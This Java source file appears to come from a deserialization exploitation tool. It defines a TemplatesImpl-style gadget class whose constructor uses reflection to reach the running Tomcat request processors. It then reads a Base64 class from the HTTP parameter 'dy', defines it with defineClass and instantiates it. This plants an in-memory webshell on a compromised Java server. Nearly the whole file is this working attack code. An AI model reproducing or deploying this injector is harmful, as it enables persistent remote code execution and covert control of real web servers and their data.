package vulgui.deser.plugins;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;

/**
 * @className InjectMomBehinder
 * @Description TODO
 * @Author sunnylast0
 * @Date 2020/10/19 17:27
 * @Version 1.0
 **/
public class InjectMemTool extends AbstractTranslet {
    private static Object getFV(Object o, String s) throws Exception {
        Field f = null;
        Class clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(s);
        }
        f.setAccessible(true);
        return f.get(o);
    }

    public InjectMemTool() {
        try {
            Object o;
            String s;
            String dy = null;
            Object resp;
            boolean done = false;
            Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (int i = 0; i < ts.length; i++) {
                Thread t = ts[i];
                if (t == null) {
                    continue;
                }
                s = t.getName();
                if (!s.contains("exec") && s.contains("http")) {
                    o = getFV(t, "target");
                    if (!(o instanceof Runnable)) {
                        continue;
                    }

                    try {
                        o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                    } catch (Exception e) {
                        continue;
                    }

                    java.util.List ps = (java.util.List) getFV(o, "processors");
                    for (int j = 0; j < ps.size(); j++) {
                        Object p = ps.get(j);
                        o = getFV(p, "req");
                        resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);

                        Object conreq = o.getClass().getMethod("getNote", new Class[]{int.class}).invoke(o, new Object[]{new Integer(1)});

                        dy = (String) conreq.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(conreq, new Object[]{new String("dy")});

                        if (dy != null && !dy.isEmpty()) {
                            byte[] classbytes = org.apache.shiro.codec.Base64.decode(dy);

                            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                            defineClassMethod.setAccessible(true);

                            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{classbytes, new Integer(0), new Integer(classbytes.length)});

                            cc.newInstance().equals(conreq);
                            done = true;
                        }
                        if (done) {
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }


//    public static void main(String[] args) throws IOException, CannotCompileException {
////        readClassFile();
////        System.out.println(this.getClass().getClassLoader());
//    }
}
